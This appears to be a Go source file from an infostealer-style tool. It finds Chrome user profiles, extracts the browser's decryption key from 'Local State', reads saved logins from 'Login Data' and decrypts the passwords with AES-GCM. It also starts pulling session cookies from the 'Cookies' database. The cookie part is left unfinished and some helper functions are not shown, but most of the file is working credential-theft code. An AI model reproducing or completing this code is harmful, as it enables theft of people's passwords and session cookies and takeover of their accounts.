package internals

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"errors"
	"fmt"
	"net/http"
	"os"
	"strings"
)

type Chrome struct {
	name          string
	basePath      string
	profilePaths  []string // .../Profile X
	decryptionKey []byte   // found in "Local State"
}

func NewChrome() (Chrome, error) {
	fmt.Print("[+] Initializing Chrome\n")
	name := "chrome"
	homeDir, _ := os.UserHomeDir()
	basePath, err := getChromiumBasePath(name)
	if err != nil {
		return Chrome{name, basePath, nil, nil}, err
	} else {
		basePath = homeDir + basePath
	}

	profilePaths, err := getChromeProfiles(basePath)
	if err != nil {
		return Chrome{name, basePath, nil, nil}, err
	}

	decKey, err := getChromiumDecryptionKey(fmt.Sprintf("%s\\%s", basePath, "Local State"))
	if err != nil {
		return Chrome{name, basePath, nil, nil}, err
	}

	return Chrome{name, basePath, profilePaths, decKey}, nil
}

// Extract login credentials from Chrome "Login Data" file
// TODO: refactor, only thing that changes is basePath
func (c Chrome) DumpCredentials() ([][]Credentials, error) {
	fmt.Print("[+] Dumping Chrome Credentials\n")

	dump := make([][]Credentials, len(c.profilePaths))
	for _, profile := range c.profilePaths {
		credentials, err := getChromiumCredentials(fmt.Sprintf("%s\\%s", profile, "Login Data"))
		if err != nil {
			return nil, err
		}

		if len(credentials) == 0 {
			continue
		}

		for i := range credentials {
			c.DecryptPassword(&credentials[i].Password)
		}
		dump = append(dump, credentials)
	}
	return dump, nil
}

func (c Chrome) DumpCookies() ([][]http.Cookie, error) {
	dump := make([][]http.Cookie, len(c.profilePaths))
	for _, profile := range c.profilePaths {
		cookies, err := getChromeCookies(fmt.Sprintf("%s\\%s\\%s", profile, "Network", "Cookies"))
		if err != nil {
			return nil, err
		}

		if len(cookies) == 0 {
			continue
		}

		fmt.Printf("> %s\n", profile)
		for _, cookie := range cookies {
			fmt.Printf("%s", cookie.String())
		}
		dump = append(dump, cookies)
	}
	return dump, nil
}

// TODO: refactor, is the same for brave
func (c Chrome) DecryptPassword(psw *[]byte) {
	password := *psw
	iv := password[3:15]
	ps := password[15:]

	block, err := aes.NewCipher(c.decryptionKey)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plain, err := aesgcm.Open(nil, iv, ps, nil)
	*psw = plain
}

func getChromeProfiles(basePath string) ([]string, error) {
	profilePaths := make([]string, 0)
	content, err := os.ReadDir(basePath)
	if err != nil {
		return profilePaths, err
	}

	localStateFound := false
	for _, entry := range content {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile") {
			profile := fmt.Sprintf("%s\\%s", basePath, entry.Name())
			profilePaths = append(profilePaths, profile)
		}

		if entry.Name() == "Local State" {
			localStateFound = true
		}
	}

	// Get chrome credentials decryption key
	if localStateFound {
		return profilePaths, nil
	} else {
		return profilePaths, errors.New("[!] Local State not found")
	}
}

func getChromeCookies(path string) ([]http.Cookie, error) {
	cookies := make([]http.Cookie, 0)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		panic(err)
	}
	defer db.Close()

	selectStatement := "SELECT name, encrypted_value, host_key, path, expires_utc FROM cookies"
	rows, err := db.Query(selectStatement)
	if err != nil {
		return cookies, err
	}

	defer rows.Close()
	for rows.Next() {
		var (
			name, host_key, path, expires_utc string
			encrypted_key                     []byte
		)

		err = rows.Scan(&name, &encrypted_key, &host_key, &path, &expires_utc)
		if err != nil {
			return cookies, err
		}

		if name == "" || host_key == "" || path == "" || expires_utc == "" || len(encrypted_key) == 0 {
			continue
		}

		// ...

	}

	return cookies, nil
}
